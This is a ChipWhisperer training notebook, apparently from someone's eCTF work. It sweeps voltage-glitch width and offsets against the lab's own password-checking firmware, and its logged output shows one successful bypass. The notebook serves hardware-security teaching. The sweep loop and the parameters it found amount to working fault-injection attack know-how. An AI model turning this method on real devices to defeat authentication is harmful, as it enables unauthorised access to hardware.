# Part 2, Topic 2: Voltage Glitching to Bypass Password

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *We've seen how voltage glitching can be used to corrupt calculations, just like clock glitching. Let's continue on and see if it can also be used to break past a password check.*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching

## Firmware

Again, we've already covered this lab, so it'll be mostly up to you!

In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWHUSKY'
SS_VER = 'SS_VER_2_1'

In [2]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

/Users/xcrbox/Desktop/2026-eCTF/chipwhisperer/jupyter/.venv/lib/python3.10/site-packages/chipwhisperer/capture/trace/TraceWhisperer.py:31: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources # type: ignore


INFO: Found ChipWhisperer😍
scope.gain.gain                          changed from 0                         to 22                       
scope.gain.db                            changed from 15.0                      to 25.091743119266056       
scope.adc.samples                        changed from 131124                    to 5000                     
scope.clock.clkgen_freq                  changed from 0                         to 7363636.363636363        
scope.clock.adc_freq                     changed from 0                         to 29454545.454545453       
scope.io.tio1                            changed from serial_tx                 to serial_rx                
scope.io.tio2                            changed from serial_rx                 to serial_tx                
scope.io.hs2                             changed from None                      to clkgen                   
scope.glitch.phase_shift_steps           changed from 0                         to 4592              

In [3]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/simpleserial-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
arm-none-eabi-gcc (Arm GNU Toolchain 14.3.Rel1 (Build arm-14.174)) 14.3.1 20250623
Copyright (C) 2024 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

mkdir -p objdir-CWHUSKY 
.
.
.
.
Welcome to another exciting ChipWhisperer target build!!
.
.
.
.
.
.
.
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
Compiling:
    .././hal//sam4s/sysclk.c ...    simpleserial-glitch.c ...    .././hal//sam4s/pmc.c ...    .././simpleserial/simpleserial.c ...    .././hal//sam4s/sam4s_hal.c ...    .././hal//sam4s/system_sam4s.c ...    .././hal//sam4s/uart.c ...    .././hal//sam4s/pio.c ...    .././hal/hal.c ...    .././hal//sam4s/startup_sam4s.c ...Done!
Done!
Done!
Done!
Done!
Done!
Done!
Done!
Done!
Done!
.
LINKING:
    simpleserial-glitch-CWHUSKY.elf ...Memory region     

In [4]:
fw_path = "../../../firmware/mcu/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)
if SS_VER=="SS_VER_2_1":
    target.reset_comms()

In [5]:
def reboot_flush():
    reset_target(scope)
    target.flush()
if PLATFORM == "CWLITEXMEGA":
    scope.clock.clkgen_freq = 32E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*32/7.37
    else:
        target.baud = 38400*32/7.37
elif (PLATFORM == "CWLITEARM") or ("F3" in PLATFORM):
    scope.clock.clkgen_freq = 24E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*24/7.37
    else:
        target.baud = 38400*24/7.37
    

In [6]:
#Do glitch loop
reboot_flush()
pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])
target.simpleserial_write('p', pw)

val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

print(val)
print(val['payload'][0])

{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
1


Like with clock glitching, the scope object can set some typical glitch settings for you:

In [7]:
if scope._is_husky:
    scope.vglitch_setup('hp', default_setup=False) # HP alone works best for Husky
else:
    scope.vglitch_setup('both', default_setup=False) # use both transistors

In [8]:

scope.glitch.enabled = True
scope.glitch.clk_src = "pll"
scope.io.glitch_hp = True
scope.io.glitch_lp = False

scope.glitch.output = "glitch_only" # glitch_out = clk ^ glitch
scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called

scope.adc.lo_gain_errors_disabled = True
scope.adc.clip_errors_disabled = True

In [9]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

In [10]:
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None})

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [width,offset]
      .Points.II :Points   [width,offset]

In [22]:
import re
import struct

#disable logging
cw.set_all_log_levels(cw.logging.CRITICAL)

gc.set_range("width", 1800, 2200)
gc.set_range("offset", 0, 4000)
gc.set_global_step(10)

gc.set_range("ext_offset", 0, 150)
gc.set_step("ext_offset", 10) # check each clock cycle

scope.adc.timeout = 0.9

reboot_flush()

successes = 0

for glitch_settings in gc.glitch_values():
    scope.glitch.offset = glitch_settings[1]
    scope.glitch.width = glitch_settings[0]
    scope.glitch.ext_offset = glitch_settings[2]
    if scope.adc.state:
        # can detect crash here (fast) before timing out (slow)
        #print("Trigger still high!")
        gc.add("reset")
        reboot_flush()

    scope.arm()
    target.simpleserial_write('p', bytearray([0]*5))
    ret = scope.capture()
    scope.io.vglitch_reset()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)#For loop check
        if val['valid'] is False:
            gc.add("reset")
        else:
            if val['payload'][0] == 0x01: #for loop check
                successes +=1 
                gc.add("success")
                print(val)
                print(val['payload'])
                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                print("🐙", end="")
                break
            else:
                gc.add("normal")
                    
#reenable logging
cw.set_all_log_levels(cw.logging.WARNING)

{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
CWbytearray(b'01')
1910 2850 120
🐙

In [23]:
import plotly.graph_objects as go
import plotly.express as px
import pandas as pd
import plotly.io as pio

#pio.renderers.default = 'iframe'
results = gc.calc(ignore_params=[], sort="success_rate")
data = [
    {
        "width": results[index][0][0],
        "offset": results[index][0][1],
        "ext_offset": results[index][0][2],
        "success": results[index][1]['success'],
        "reset": results[index][1]['reset']
    } for index in range(len(results))
]
rgba_colors = ['rgba({},{},0,{:.2f})'.format(255 * val['reset'], 255 * val['success'], val['success'] + (0.5 * val['reset'])) for val in data]  # Example: fade near zero

go.Figure(go.Scatter3d(
    x=[i['ext_offset'] for i in data], y=[i['width'] for i in data], z=[i['offset'] for i in data],
    mode='markers',
    marker=dict(size=3, color=rgba_colors)
)).show()

Let's see where we needed to target for our glitch to work:

In [14]:
gc.calc(["width", "offset"], "success_rate")

[((120,),
  {'total': 131,
   'success': 1,
   'success_rate': 0.007633587786259542,
   'reset': 18,
   'reset_rate': 0.13740458015267176,
   'normal': 112,
   'normal_rate': 0.8549618320610687}),
 ((150,),
  {'total': 127,
   'success': 0,
   'success_rate': 0.0,
   'reset': 7,
   'reset_rate': 0.05511811023622047,
   'normal': 120,
   'normal_rate': 0.9448818897637795}),
 ((140,),
  {'total': 120,
   'success': 0,
   'success_rate': 0.0,
   'reset': 7,
   'reset_rate': 0.058333333333333334,
   'normal': 113,
   'normal_rate': 0.9416666666666667}),
 ((130,),
  {'total': 127,
   'success': 0,
   'success_rate': 0.0,
   'reset': 8,
   'reset_rate': 0.06299212598425197,
   'normal': 119,
   'normal_rate': 0.937007874015748}),
 ((110,),
  {'total': 121,
   'success': 0,
   'success_rate': 0.0,
   'reset': 10,
   'reset_rate': 0.08264462809917356,
   'normal': 111,
   'normal_rate': 0.9173553719008265}),
 ((100,),
  {'total': 130,
   'success': 0,
   'success_rate': 0.0,
   'reset': 9,
   

In [13]:
scope.dis()
target.dis()